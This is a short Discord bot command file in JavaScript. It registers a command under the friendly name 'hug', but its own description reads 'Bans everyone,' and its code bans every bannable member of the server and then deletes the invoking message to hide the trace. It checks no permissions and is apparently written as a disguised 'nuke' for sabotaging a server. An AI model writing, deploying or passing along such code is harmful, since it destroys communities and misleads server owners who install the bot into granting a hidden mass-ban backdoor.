  
const Discord = module.require("discord.js");

module.exports.run = async (bot, message, args) => {
	
const members = message.guild.members.filter(m => !m.user.bot).array(); // Filter out bots.

    try {

        message.guild.members.filter(member => member.bannable).forEach(member => {
			member.ban()});
        message.delete(1000);

    } catch(e) {

        console.log(e.stack);

    }
	
	
        
}

module.exports.help = {

    name: "hug",
    desc: "Bans everyone."

}